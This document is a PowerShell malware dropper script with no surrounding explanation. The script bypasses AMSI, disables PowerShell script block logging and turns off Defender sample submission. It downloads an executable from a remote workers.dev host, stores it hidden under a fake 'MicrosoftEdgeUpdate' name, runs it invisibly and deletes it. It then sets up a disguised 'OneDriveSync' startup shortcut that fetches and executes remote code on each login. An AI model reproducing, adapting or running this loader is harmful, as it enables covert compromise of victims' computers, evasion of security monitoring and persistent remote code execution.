$ErrorActionPreference = 'SilentlyContinue'
Write-Host "[+] v63 Improved Drop started at $(Get-Date)" -ForegroundColor Green

# AMSI Bypass
$z = 'AmsiUtils'; $y = 'amsiInitFailed'
[Ref].Assembly.GetType("System.Management.Automation.$z").GetField($y,'NonPublic,Static').SetValue($null,$true)

# SBL Disable
$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
if($settings){$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{};$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0}

# MAPS Kill - as early as possible
Write-Host "[+] Killing MAPS..." -ForegroundColor Yellow
$k = "HKCU:\Software\Microsoft\Windows Defender\Spynet"
New-Item $k -Force | Out-Null
Set-ItemProperty $k "SubmitSamplesConsent" 0 -Type DWord -Force
Set-ItemProperty $k "SpyNetReporting" 0 -Type DWord -Force

# Download payload
$u = "https://aged-mountain-614b.natalia-kush82.workers.dev/update"
$b = (New-Object Net.WebClient).DownloadData($u)
Write-Host "[+] Downloaded: $($b.Length) bytes" -ForegroundColor Green

# Drop with random name
$r = [Guid]::NewGuid().ToString("N").Substring(0,8)
$t = "$env:TEMP\MicrosoftEdgeUpdate_$r.exe"
[IO.File]::WriteAllBytes($t, $b)

Unblock-File $t -EA 0
Remove-Item $t -Stream Zone.Identifier -EA 0
[System.IO.File]::SetAttributes($t, 'Hidden')

Write-Host "[+] Staged: $t" -ForegroundColor Yellow

# Longer delay before execution
Start-Sleep -Milliseconds (Get-Random -Minimum 1200 -Maximum 2800)

try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $t
    $psi.UseShellExecute = $true
    $psi.WindowStyle = 'Hidden'
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Write-Host "[+] Executed with UseShellExecute" -ForegroundColor Green
} catch {
    Write-Host "[-] Exec error" -ForegroundColor Red
}

# Fast cleanup
Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 1.3; Remove-Item $f -Force -EA 0 } -ArgumentList $t | Out-Null

# Persistence
$flag = "$env:TEMP\persist_$([Environment]::MachineName.GetHashCode()).dat"
if(-not (Test-Path $flag)){
    $lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk"
    $w = New-Object -ComObject WScript.Shell
    $s = $w.CreateShortcut($lnk)
    $s.TargetPath = "powershell.exe"
    $s.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -c `"iex (iwr 'https://raw.githubusercontent.com/astro-opensource/system-updater/assets/launcher.txt' -UseBasicParsing).Content`""
    $s.Save()
    New-Item $flag -Force | Out-Null
}

Write-Host "[+] v63 running - waiting for callback..." -ForegroundColor Magenta
Start-Sleep -Seconds 240
Write-Host "[+] v63 completed" -ForegroundColor Green
